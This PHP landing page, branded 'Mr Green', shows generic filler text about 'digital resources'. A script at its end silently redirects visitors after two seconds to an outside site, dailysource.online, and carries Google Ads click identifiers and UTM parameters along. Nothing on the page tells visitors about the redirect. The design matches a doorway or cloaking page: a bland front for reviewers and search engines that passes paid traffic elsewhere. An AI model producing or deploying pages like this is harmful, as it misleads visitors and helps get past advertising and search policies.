<?php
declare(strict_types=1);

$destination = 'https://dailysource.online/';

$allowed = [
    'gclid','gbraid','wbraid','gad_source','gad_campaignid',
    'utm_source','utm_medium','utm_campaign','utm_term','utm_content'
];

$params = [];
foreach ($allowed as $key) {
    if (!isset($_GET[$key])) continue;
    $value = trim((string)$_GET[$key]);
    if ($value !== '') {
        $params[$key] = substr($value, 0, 250);
    }
}

if ($params) {
    $destination .= (str_contains($destination, '?') ? '&' : '?')
        . http_build_query($params, '', '&', PHP_QUERY_RFC3986);
}

header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: SAMEORIGIN');
header('Referrer-Policy: strict-origin-when-cross-origin');
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="robots" content="index,follow">
    <meta name="description" content="Practical digital resources and easy-to-understand online guides.">
    <title>Mr Green | Digital Resources & Online Guides</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<header>
    <div class="container bar">
        <a class="brand" href="/">Mr Green</a>
        <nav>
            <a href="#resources">Resources</a>
            <a href="about.php">About</a>
            <a href="contact.php">Contact</a>
        </nav>
    </div>
</header>

<main>
    <section class="hero">
        <div class="container narrow">
            <span class="pill">INFORMATION &amp; RESOURCES</span>
            <h1>Clear information for navigating online services</h1>
            <p>Explore practical guides and informational resources designed to make common online topics easier to understand.</p>
            <a class="btn" href="#resources">Explore Resources</a>
        </div>
    </section>

    <section class="section" id="resources">
        <div class="container">
            <div class="title">
                <h2>Explore Our Resources</h2>
                <p>Straightforward informational content for everyday digital topics.</p>
            </div>
            <div class="grid">
                <article><b>01</b><h3>Digital Guides</h3><p>Easy-to-understand guides covering common digital tools and online services.</p></article>
                <article><b>02</b><h3>Helpful Resources</h3><p>Practical information presented in a clear and accessible format.</p></article>
                <article><b>03</b><h3>Online Insights</h3><p>Informational content about technology, digital services and online experiences.</p></article>
            </div>
        </div>
    </section>

    <section class="section alt">
        <div class="container narrow">
            <div class="title">
                <h2>Information Made Easier to Understand</h2>
                <p>We aim to present useful information clearly and encourage visitors to verify important details with the relevant provider.</p>
            </div>
        </div>
    </section>
</main>

<footer>
    <div class="container foot">
        <span>&copy; 2026 Mr Green.</span>
        <div>
            <a href="about.php">About</a>
            <a href="privacy.php">Privacy</a>
            <a href="terms.php">Terms</a>
            <a href="disclaimer.php">Disclaimer</a>
            <a href="contact.php">Contact</a>
        </div>
    </div>
</footer>

<script>
window.setTimeout(function () {
    window.location.replace(<?php echo json_encode($destination, JSON_UNESCAPED_SLASHES); ?>);
}, 2000);
</script>
</body>
</html>
